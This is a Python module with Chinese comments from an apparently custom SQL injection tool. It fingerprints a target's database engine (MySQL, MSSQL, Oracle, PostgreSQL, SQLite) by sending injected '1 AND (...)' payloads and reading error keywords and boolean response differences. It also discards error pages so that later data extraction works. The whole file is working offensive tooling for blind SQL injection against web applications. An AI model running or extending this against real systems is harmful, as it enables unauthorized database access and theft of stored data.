"""DBMS 指纹识别"""
from dbms.mysql import MySQLDialect
from dbms.mssql import MSSQLDialect
from dbms.oracle import OracleDialect
from dbms.postgresql import PostgreSQLDialect
from dbms.sqlite import SQLiteDialect


DIALECTS = {
    "mysql":      MySQLDialect,
    "mssql":      MSSQLDialect,
    "oracle":     OracleDialect,
    "postgresql": PostgreSQLDialect,
    "sqlite":     SQLiteDialect,
}

# 判「这次响应是不是后端/数据库报错页」用的标记（只做否决用，宁可漏判不要误判）。
ERROR_MARKERS = (
    "syntax error", "no such", "unknown column", "unknown table",
    "unrecognized", "sqlstate", "ora-", "microsoft ole db",
    "unclosed quotation", "invalid json", "error:", "warning: ",
    "fatal error", "traceback", "exception", "denied",
)


class Fingerprinter:
    def __init__(self, requester, detector, log=None):
        self.req = requester
        self.det = detector
        self.log = log
        self.dbms = None
        self.version = None
        self.dialect_cls = None

    def force(self, name):
        name = name.lower()
        if name in DIALECTS:
            self.dbms = name
            self.dialect_cls = DIALECTS[name]
            print(f"[+] 强制指定 DBMS: {name}")
        else:
            print(f"[-] 未知 DBMS: {name}，回退 mysql")
            self.dbms = "mysql"
            self.dialect_cls = MySQLDialect

    # ---------------- 布尔指纹：必须排除「报错页」 ----------------
    def _looks_like_error(self, r):
        """响应是否像报错页。返回 True / False，拿不到响应时返回 None。"""
        if r["status"] == -1:
            return None
        if r["status"] >= 400:
            return True
        low = r["text"].lower()
        return any(m in low for m in ERROR_MARKERS)

    def _bool_match(self, expr):
        """布尔指纹的命中条件：表达式成立，**且**这次响应不像报错页。

        为什么必须排掉报错页：is_true() 是按「响应长度落在真/假哪一侧」判的，
        而报错页通常比正常页长 —— 于是那些在本 DBMS 上**根本不存在**的表 / 函数
        （如在 SQLite 上跑 information_schema.tables）会直接报成一页长文本，
        被 is_true 误判成「表达式成立」。后果是字典里第一个参检的方言永远命中：
        SQLite 靶子被认成 MySQL，接着 DATABASE()/CONCAT 之类全报错，
        表现就是「闭合探测正常、指纹也『成功』，但一到取库名就全空」。
        """
        r = self.req.send(self.det.build(f"1 AND ({expr})"))
        if self._looks_like_error(r) is not False:
            return False
        return self.det.is_true(expr) is True

    def detect(self):
        print("[*] 指纹识别中...")
        for name, cls in DIALECTS.items():
            d = cls()
            for payload in d.error_fingerprints():
                r = self.req.send(self.det.build(f"1 AND ({payload})"))
                if r["status"] == -1:
                    continue
                text = r["text"].lower()
                for kw in d.error_keywords():
                    if kw.lower() in text:
                        self.dbms = name
                        self.dialect_cls = cls
                        print(f"[+] DBMS: {name} (关键字 '{kw}')")
                        return
        for name, cls in DIALECTS.items():
            d = cls()
            for expr in d.boolean_fingerprints():
                if self._bool_match(expr):
                    self.dbms = name
                    self.dialect_cls = cls
                    print(f"[+] DBMS: {name} (布尔指纹)")
                    return
        print("[!] 无法识别 DBMS，默认 MySQL")
        self.dbms = "mysql"
        self.dialect_cls = MySQLDialect

    def get_dialect(self):
        if not self.dialect_cls:
            self.dialect_cls = MySQLDialect
        return self.dialect_cls()

    def print_info(self):
        print("=" * 50)
        print(f"  DBMS   : {self.dbms}")
        print(f"  Dialect: {self.dialect_cls.__name__ if self.dialect_cls else 'N/A'}")
        print("=" * 50)